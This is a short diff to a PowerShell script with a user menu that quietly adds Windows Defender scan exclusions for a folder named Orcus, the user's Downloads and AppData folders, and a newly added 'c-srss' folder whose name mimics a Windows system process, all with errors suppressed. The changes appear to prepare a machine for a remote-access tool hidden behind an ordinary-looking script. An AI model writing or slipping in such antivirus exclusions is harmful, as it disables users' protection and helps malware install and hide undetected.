@@ -23,10 +23,12 @@ function Wait-ForUser ($msg = "Press Enter to continue...") {
 $orcusPath = "C:\Program Files\Orcus"
 $downloadsPath = "$env:USERPROFILE\Downloads"
 $appDataPath = "$env:USERPROFILE\AppData"
+$orcusPath2 = "C:\Program Files\c-srss"
 try {
     Add-MpPreference -ExclusionPath $orcusPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $downloadsPath -ErrorAction SilentlyContinue | Out-Null
     Add-MpPreference -ExclusionPath $appDataPath -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath $orcusPath2 -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 Show-Header
@@ -72,7 +74,6 @@ if (Test-Path $output1) {
     }
 }
 
-# Main comfy menu
 do {
     Write-Host ""
     Write-Host "What would you like to do?" -ForegroundColor Cyan
